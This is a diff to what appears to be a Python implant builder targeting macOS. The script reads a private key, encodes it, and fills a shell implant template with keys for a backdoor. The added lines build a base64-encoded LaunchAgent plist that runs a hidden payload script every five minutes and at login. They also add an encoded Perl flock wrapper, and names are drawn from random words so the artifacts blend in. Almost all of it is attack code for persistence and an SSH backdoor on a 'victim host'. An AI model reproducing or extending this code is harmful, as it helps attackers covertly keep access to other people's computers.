@@ -75,6 +75,7 @@ def main():
     payloadkeyname = "".join(getrandomwords(2))
     flockfilename = "".join(getrandomwords(1))
     lagentname = f"com.{'.'.join(getrandomwords(2))}.worker"
+    imaginarypayloadname = "".join(getrandomwords(1))
     
     print ("[*] victim host: %s" % victim_hostname)
     print ("[*] fqdn: %s" % fqdn)
@@ -96,6 +97,27 @@ def main():
     privstring = getfile(KEYPATH)
     privencoded = privstring.encode("utf-8")
     privkey = base64.b64encode(privencoded)
+
+    lagentPlistXML = base64.b64encode(f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>{lagentname}</string>
+  <key>Program</key>
+  <string>/Users/home/Library/LaunchAgents/{imaginarypayloadname}.sh</string>
+  <key>StartInterval</key>
+  <integer>300</integer>
+  <key>RunAtLoad</key>
+  <true/>
+</dict>
+</plist>'''.encode('utf-8')).decode('utf-8')
+
+    mother_flock = base64.b64encode(f"""#!/usr/bin/env perl
+# {" ".join(getrandomwords(3))}
+use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB or die;system(@ARGV);
+# {" ".join(getrandomwords(2))}""".encode('utf-8')).decode('utf-8')
+
     implant_py = getfile(os.path.join(sys.path[0], "loadssh_template.sh"))
     cleanup_py = getfile(os.path.join(sys.path[0], "cleanup.py"))
     implant = templify(implant_py, {
@@ -107,7 +129,10 @@ def main():
         "BACKFLIP_PUB_PLACEHOLDER" : backkey.decode("utf-8"),
         "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
         "FLOCK_NAME_PLACEHOLDER" : flockfilename,
+        "FLOCK_CODE_PLACEHOLDER" : mother_flock,
+        "LAGENT_XML_PLACEHOLDER" : lagentPlistXML,
         "LAGENT_NAME_PLACEHOLDER" : lagentname,
+        "IMAGINARY_PAYLOAD_NAME" : imaginarypayloadname,
         })
     implant_clean = templify(cleanup_py,{
         "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
